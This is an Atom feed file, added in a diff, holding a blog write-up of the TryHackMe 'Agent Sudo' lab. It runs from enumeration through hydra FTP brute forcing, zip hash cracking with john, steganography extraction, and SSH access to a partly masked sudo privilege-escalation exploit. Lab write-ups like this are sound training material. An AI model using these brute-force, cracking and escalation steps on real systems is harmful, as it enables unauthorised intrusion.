@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Writups - agent sudo</title>
+    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
+    <link href="https://theanxiuser.github.io/writups/tags/agent-sudo/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://theanxiuser.github.io/writups"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-10-22T00:00:00+00:00</updated>
+    <id>https://theanxiuser.github.io/writups/tags/agent-sudo/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Agent Sudo - TryHackMe Writup</title>
+        <published>2024-10-22T00:00:00+00:00</published>
+        <updated>2024-10-22T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/agent-sudo/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/agent-sudo/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;agent_sudo.png&quot; alt=&quot;Agent Sudo&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP: 10.10.165.175&lt;&#x2F;p&gt;
+&lt;p&gt;There are 3 ports are open.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nmap 10.10.165.175 -v&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;
+PORT   STATE SERVICE
+21&#x2F;tcp open  ftp
+22&#x2F;tcp open  ssh
+80&#x2F;tcp open  http
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The message shown in homepage, &lt;code&gt;http:&#x2F;&#x2F;10.10.165.175&#x2F;&lt;&#x2F;code&gt; is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;It seems need to use &lt;code&gt;user-agent&lt;&#x2F;code&gt; as codename. The codename is from A to Z maybe, as there is shown Agent R. For that i will use BurpSuite.&lt;&#x2F;p&gt;
+&lt;p&gt;I have inserted playod in &lt;code&gt;user-agent&lt;&#x2F;code&gt; from A to Z, and forwarded through intruder. &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;snipper_attack_burpsuite.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Response length for C and R are different, for C less and for R more. By analyzing I found R have much content as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+	
+Dear agents,
+Use your own &lt;b&gt;codename&lt;&#x2F;b&gt; as user-agent to access the site.
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;But in case of C, there is status code &lt;code&gt;302&lt;&#x2F;code&gt; and the locetion is 
+&lt;code&gt;Location: agent_C_attention.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;response_user_agent_C.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now visit the location we found,&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The agent name is &lt;code&gt;chris&lt;&#x2F;code&gt; and it says the password is weak.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-attack&quot;&gt;2. Attack&lt;&#x2F;h2&gt;
+&lt;p&gt;Lets try out password crack for user cheris in FTP.
+we will use hydra for attack and rockyou.txt for password list.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;hydra -l chris -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.165.175 ftp&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;ftp_password_attack_result.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After the successful login to FTP, we got &lt;&#x2F;p&gt;
+&lt;pre&gt;
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+&lt;&#x2F;pre&gt;
+&lt;p&gt;All the files are download by simply &lt;code&gt;get&lt;&#x2F;code&gt; command.&lt;&#x2F;p&gt;
+&lt;p&gt;The message says that the password is stored inside the image. So need to apply the concept to steganography.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#x27;t be a problem for you.
+
+From,
+Agent C
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now, using &lt;code&gt;binwalk&lt;&#x2F;code&gt; and getting info if found.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ binwalk cute-alien.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+❯ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now extracting the cutie.png using &lt;code&gt;binwalk -e cutie.png&lt;&#x2F;code&gt; we have 365,  365.zlib and  8702.zip files, zip is important and is password protected.&lt;&#x2F;p&gt;
+&lt;p&gt;Using &lt;code&gt;John The Ripper&lt;&#x2F;code&gt; to crack this password. First creating hash by &lt;code&gt;zip2john 8702.zip &amp;gt; zip_pass.hash&lt;&#x2F;code&gt; and then cracking the hash as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt zip_pass.hash
+.............
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+ali**            (8702.zip&#x2F;To_agentR.txt)
+1g 0:00:00:00 DONE (2024-10-08 17:45) 1.162g&#x2F;s 28576p&#x2F;s 28576c&#x2F;s 28576C&#x2F;s christal..280789
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have zip password, extract it. The message found is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+Agent C,
+
+We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!
+
+By,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Here &lt;code&gt;QXJlYTUx&lt;&#x2F;code&gt; is encoded, lets decode using base64 as &lt;&#x2F;p&gt;
+&lt;pre&gt;
+echo &#x27;QXJlYTUx&#x27; | base64 -d
+Area**
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now look into cute-alien.jpg, using &lt;code&gt;steghide&lt;&#x2F;code&gt;. After the command &lt;code&gt;steghide --info cute-alien.jpg&lt;&#x2F;code&gt;, we found that the &lt;code&gt;message.txt&lt;&#x2F;code&gt; file is embedded there.&lt;&#x2F;p&gt;
+&lt;p&gt;Extracting it using &lt;code&gt;steghide --extract -sf cute-alien.jpg&lt;&#x2F;code&gt;. The message is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ cat message.txt
+Hi jam**,
+
+Glad you find this message. Your login password is hacker******
+
+Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;3-capture-the-flag&quot;&gt;3. Capture the Flag&lt;&#x2F;h2&gt;
+&lt;p&gt;Here we got SSH username and password. Now connect to it as
+&lt;code&gt;ssh jam**@10.10.165.175&lt;&#x2F;code&gt;, got the user flag.
+&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;user_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;To know the incident of the photo &lt;code&gt;Alien_autospy.jpg&lt;&#x2F;code&gt; we need to download (maybe using scp) and search on google as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;scp jam**@10.10.165.175:&#x2F;home&#x2F;jam**&#x2F;Alien_autospy.jpg .&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;By searching we found the image from &lt;code&gt;Roswell&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;Starting from &lt;code&gt;sudo -l&lt;&#x2F;code&gt;, found that user can run &#x2F;bin&#x2F;bash only as sudo. Now looking for sudo vulnerability for the version &lt;code&gt;1.8.21p2&lt;&#x2F;code&gt; (googling it.), we have CVE-2019-14***.&lt;&#x2F;p&gt;
+&lt;p&gt;The exploit is &lt;code&gt;sudo ***** &#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; (found in exploit-db) and we got&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;root_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Final message from Agent R is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+By,
+Des*** a.k.a Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
